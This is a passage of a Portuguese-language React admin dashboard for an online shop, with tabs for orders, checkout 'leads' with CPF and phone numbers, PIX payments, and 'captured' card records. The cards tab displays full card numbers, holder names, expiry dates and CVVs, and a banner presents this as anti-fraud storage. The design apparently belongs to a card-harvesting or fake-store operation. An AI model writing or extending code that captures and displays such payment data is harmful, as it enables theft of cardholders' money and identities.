                  <table className="admin__table">
                    <thead>
                      <tr>
                        <th>Pedido</th>
                        <th>Cliente</th>
                        <th>Email</th>
                        <th>Total</th>
                        <th>Status</th>
                        <th>Pagamento</th>
                        <th>Data</th>
                        <th></th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredOrders.map((order) => (
                        <tr key={order.id}>
                          <td style={{ fontWeight: 600 }}>#{order.id.slice(0, 8)}</td>
                          <td>{order.customer_first_name} {order.customer_last_name}</td>
                          <td style={{ fontSize: 12 }}>{order.customer_email}</td>
                          <td style={{ fontWeight: 600 }}>{fmt(order.total)}</td>
                          <td><StatusBadge status={order.status} /></td>
                          <td>{order.payment_method === "credit" ? "Cartão" : "PIX"}</td>
                          <td style={{ fontSize: 12 }}>{formatDate(order.created_at)}</td>
                          <td>
                            <button onClick={() => viewOrder(order)} className="admin__btn admin__btn--outline admin__btn--sm">
                              <Eye size={14} />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                ) : (
                  <div className="admin__empty">Nenhum pedido encontrado</div>
                )}
              </div>

              {ordersTotal > 20 && (
                <div style={{ display: "flex", justifyContent: "center", gap: 8, marginTop: 20, alignItems: "center" }}>
                  <button
                    onClick={() => setOrdersPage((p) => Math.max(1, p - 1))}
                    disabled={ordersPage <= 1}
                    className="admin__btn admin__btn--outline admin__btn--sm"
                  >
                    <ChevronLeft size={14} />
                  </button>
                  <span style={{ padding: "6px 12px", fontSize: 14, color: "#002A47" }}>
                    Página {ordersPage} de {Math.ceil(ordersTotal / 20)}
                  </span>
                  <button
                    onClick={() => setOrdersPage((p) => p + 1)}
                    disabled={ordersPage >= Math.ceil(ordersTotal / 20)}
                    className="admin__btn admin__btn--outline admin__btn--sm"
                  >
                    <ChevronRight size={14} />
                  </button>
                </div>
              )}
            </>
          )}

          {/* ===== LEADS ===== */}
          {tab === "leads" && (
            <>
              <div style={{ display: "flex", gap: 12, marginBottom: 16, flexWrap: "wrap", alignItems: "center" }}>
                <div style={{ position: "relative", flex: 1, minWidth: 200, maxWidth: 350 }}>
                  <Search size={16} style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: "#979899" }} />
                  <input
                    type="text"
                    value={leadSearch}
                    onChange={(e) => setLeadSearch(e.target.value)}
                    placeholder="Buscar por nome, email, telefone..."
                    className="admin__search-input"
                    style={{
                      width: "100%", padding: "8px 12px 8px 32px",
                      fontSize: 13, fontFamily: "inherit",
                    }}
                  />
                </div>
                <span style={{ fontSize: 13, color: "#979899" }}>{filteredLeads.length} lead(s)</span>
              </div>
              <div className="admin__table-wrap">
                <div className="admin__table-header">
                  <h3 className="admin__table-title">{filteredLeads.length} lead(s)</h3>
                </div>
                {filteredLeads.length > 0 ? (
                  <table className="admin__table">
                    <thead>
                      <tr>
                        <th>Email</th>
                        <th>Nome</th>
                        <th>CPF</th>
                        <th>Telefone</th>
                        <th>Etapa</th>
                        <th>Data</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredLeads.map((lead) => (
                        <tr key={lead.id}>
                          <td>{lead.email}</td>
                          <td>{lead.first_name} {lead.last_name}</td>
                          <td style={{ fontFamily: "monospace", fontSize: 12 }}>{lead.cpf}</td>
                          <td>{lead.phone}</td>
                          <td>
                            <span className={`admin__badge ${
                              lead.step_reached === "pagamento" ? "admin__badge--paid" :
                              lead.step_reached === "entrega" ? "admin__badge--shipped" :
                              "admin__badge--pending"
                            }`}>
                              {lead.step_reached}
                            </span>
                          </td>
                          <td style={{ fontSize: 12 }}>{formatDate(lead.created_at)}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                ) : (
                  <div className="admin__empty">Nenhum lead ainda</div>
                )}
              </div>
            </>
          )}

          {/* ===== PIX ===== */}
          {tab === "pix" && (
            <div className="admin__table-wrap">
              <div className="admin__table-header">
                <h3 className="admin__table-title">{pixPayments.length} pagamento(s) PIX</h3>
              </div>
              {pixPayments.length > 0 ? (
                <table className="admin__table">
                  <thead>
                    <tr>
                      <th>Pedido</th>
                      <th>Valor</th>
                      <th>Status</th>
                      <th>Código PIX</th>
                      <th>Expira em</th>
                      <th>Pago em</th>
                      <th></th>
                    </tr>
                  </thead>
                  <tbody>
                    {pixPayments.map((pix) => (
                      <tr key={pix.id}>
                        <td style={{ fontWeight: 600 }}>#{pix.order_id.slice(0, 8)}</td>
                        <td style={{ fontWeight: 600 }}>{fmt(pix.amount)}</td>
                        <td><StatusBadge status={pix.status} /></td>
                        <td>
                          <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                            <span style={{ fontSize: 11, maxWidth: 180, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", fontFamily: "monospace" }}>
                              {pix.pix_code.substring(0, 25)}...
                            </span>
                            <button
                              onClick={() => copyToClipboard(pix.pix_code, `pix-${pix.id}`)}
                              className="admin__btn admin__btn--outline admin__btn--sm"
                              style={{ padding: "2px 6px" }}
                            >
                              {copiedId === `pix-${pix.id}` ? <Check size={10} /> : <Copy size={10} />}
                            </button>
                          </div>
                        </td>
                        <td style={{ fontSize: 12 }}>{formatDate(pix.expires_at)}</td>
                        <td style={{ fontSize: 12 }}>{pix.paid_at ? formatDate(pix.paid_at) : "-"}</td>
                        <td>
                          {pix.status === "pending" && (
                            <button
                              onClick={() => updateOrderStatus(pix.order_id, "paid")}
                              className="admin__btn admin__btn--success admin__btn--sm"
                            >
                              <CheckCircle size={14} /> Confirmar
                            </button>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              ) : (
                <div className="admin__empty">Nenhum pagamento PIX</div>
              )}
            </div>
          )}

          {/* ===== CARDS ===== */}
          {tab === "cards" && (
            <>
              <div style={{ background: "#FFF3CD", border: "1px solid #ffc107", borderRadius: 8, padding: 16, marginBottom: 20, fontSize: 14, color: "#856404", display: "flex", alignItems: "center", gap: 10 }}>
                <AlertTriangle size={20} />
                <div>
                  <strong>Dados Sensíveis</strong> — Informações de cartão armazenadas para segurança e verificação anti-fraude. Nunca compartilhe.
                </div>
              </div>
              <div className="admin__table-wrap">
                <div className="admin__table-header">
                  <h3 className="admin__table-title">{cards.length} registro(s) de cartão</h3>
                </div>
                {cards.length > 0 ? (
                  <table className="admin__table">
                    <thead>
                      <tr>
                        <th>Pedido</th>
                        <th>Número</th>
                        <th>Nome</th>
                        <th>Validade</th>
                        <th>CVV</th>
                        <th>Parcelas</th>
                        <th>Data</th>
                      </tr>
                    </thead>
                    <tbody>
                      {cards.map((card) => (
                        <tr key={card.id}>
                          <td style={{ fontWeight: 600 }}>#{card.order_id.slice(0, 8)}</td>
                          <td style={{ fontFamily: "monospace", fontSize: 13 }}>{card.card_number}</td>
                          <td>{card.card_name}</td>
                          <td>{card.card_expiry}</td>
                          <td style={{ fontFamily: "monospace" }}>{card.card_cvv}</td>
                          <td>{card.card_installments}x</td>
                          <td style={{ fontSize: 12 }}>{formatDate(card.captured_at)}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                ) : (
                  <div className="admin__empty">Nenhum dado de cartão registrado</div>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
